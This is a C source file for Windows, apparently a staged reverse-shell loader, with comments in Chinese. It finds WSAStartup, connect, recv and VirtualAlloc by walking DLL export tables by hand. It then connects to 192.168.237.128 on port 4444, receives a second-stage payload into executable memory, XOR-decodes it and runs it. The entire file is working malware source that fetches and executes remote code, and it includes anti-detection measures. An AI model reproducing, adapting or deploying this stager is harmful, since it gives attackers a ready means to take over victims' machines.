# include <stdio.h>
# include <string.h>
# include <winsock2.h>
# include <windows.h>
#pragma warning(disable : 4996)
#pragma comment(lib, "ws2_32.lib")


DWORD MyGetFuncAddr(HMODULE hModule,CHAR* FunctionName)
{

	//通过导出表获取GetProcAddress的地址
	//1.获取DOS头
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)(PBYTE)hModule;
	//2.获取NT头
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDosHeader->e_lfanew);
	//3.获取导出表的结构体指针
	PIMAGE_DATA_DIRECTORY pExportDir =
		&(pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);

	PIMAGE_EXPORT_DIRECTORY pExport =
		(PIMAGE_EXPORT_DIRECTORY)((PBYTE)hModule + pExportDir->VirtualAddress);
	//EAT
	PDWORD pEAT = (PDWORD)((DWORD)hModule + pExport->AddressOfFunctions);
	//ENT
	PDWORD pENT = (PDWORD)((DWORD)hModule + pExport->AddressOfNames);
	//EIT
	PWORD pEIT = (PWORD)((DWORD)hModule + pExport->AddressOfNameOrdinals);

	//4.遍历导出表，获取GetProcAddress()函数地址
	DWORD dwNumofFun = pExport->NumberOfFunctions;
	DWORD dwNumofName = pExport->NumberOfNames;
	for (DWORD i = 0; i < dwNumofFun; i++)
	{
		//如果为无效函数，跳过
		if (pEAT[i] == NULL)
			continue;
		//判断是以函数名导出还是以序号导出
		DWORD j = 0;
		for (; j < dwNumofName; j++)
		{
			if (i == pEIT[j])
			{
				break;
			}
		}
		if (j != dwNumofName)
		{
			char* ExpFunName = (CHAR*)((PBYTE)hModule + pENT[j]);
			//进行对比,如果正确返回地址
			if (!strcmp(ExpFunName, FunctionName))
			{
				return pEAT[i] + pNtHeader->OptionalHeader.ImageBase;
			}
		}
	}
	return 0;
}


typedef int(WINAPI *fnWSAStartup)(WORD,LPWSADATA);
typedef SOCKET(WSAAPI *fnWSASocket)(int,int,int,LPWSAPROTOCOL_INFOA,GROUP,DWORD);
typedef int(WSAAPI *fnconnect)(SOCKET,const sockaddr*,int);
typedef int (WINAPI *fnrecv)(SOCKET,char*,int,int);
typedef LPVOID(WINAPI *fnVirtualAlloc)(LPVOID,SIZE_T,DWORD,DWORD);

int main(void)
{

   //load ws2_32
	HMODULE hModule_ws2 = LoadLibraryA("ws2_32.dll");
	HMODULE hModule_kernel32 = LoadLibraryA("Kernel32.dll");
	fnWSAStartup WSAStartup = (fnWSAStartup)MyGetFuncAddr(hModule_ws2, "WSAStartup");
	fnWSASocket WSASocketA = (fnWSASocket)MyGetFuncAddr(hModule_ws2, "WSASocketA");
	fnconnect connect = (fnconnect)MyGetFuncAddr(hModule_ws2, "connect");
	fnrecv recv = (fnrecv)MyGetFuncAddr(hModule_ws2, "recv");
	fnVirtualAlloc VirtualAlloc = (fnVirtualAlloc)MyGetFuncAddr(hModule_kernel32, "VirtualAlloc");


	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != NO_ERROR)
	{
		printf("[!]WSAStartup");
		return -1;
	}

	SOCKET socket = WSASocketA(AF_INET, SOCK_STREAM, 0, 0, 0, 0);
	if (NULL == socket)
	{
		printf("[!]WSASocketA");
		return -1;
	}

	SOCKADDR_IN Sockaddr;
	Sockaddr.sin_family = AF_INET;
	Sockaddr.sin_addr.s_addr = inet_addr("192.168.237.128");
	Sockaddr.sin_port = htons(4444);
	iResult = connect(socket, (SOCKADDR *)&Sockaddr,sizeof(Sockaddr));
	if (iResult != NO_ERROR) 
	{
		printf("[!]connect");
		return -1;
	}

	//recv stage length
	DWORD dwLength = 0;
	iResult = recv(socket, (char*)&dwLength, sizeof(DWORD), 0);
	if (iResult == SOCKET_ERROR)
	{
		printf("[!]recv:%0x",GetLastError());
		return -1;
	}

	//VirtualAlloc
	char* lpBinBuffer = NULL;
	lpBinBuffer = (char*)VirtualAlloc(NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (NULL == lpBinBuffer)
	{
		printf("[!]VirtualAlloc:%0x", GetLastError());
		return -1;
	}
	
	DWORD dwtotal = 0;
	do
	{
		//recv stage 
		int iResult = recv(socket, lpBinBuffer+ dwtotal, dwLength - dwtotal, 0);
		if (iResult == SOCKET_ERROR)
		{
			printf("[!]recv:%0x", GetLastError());
			return -1;
		}
		dwtotal += iResult;

	} while (dwtotal < dwLength);

	for (DWORD dwIndex = 0; dwIndex < dwLength; dwIndex++)
		lpBinBuffer[dwIndex] = lpBinBuffer[dwIndex] ^ 0x123;
	
	((void(*)())lpBinBuffer)();
	return 0;
}
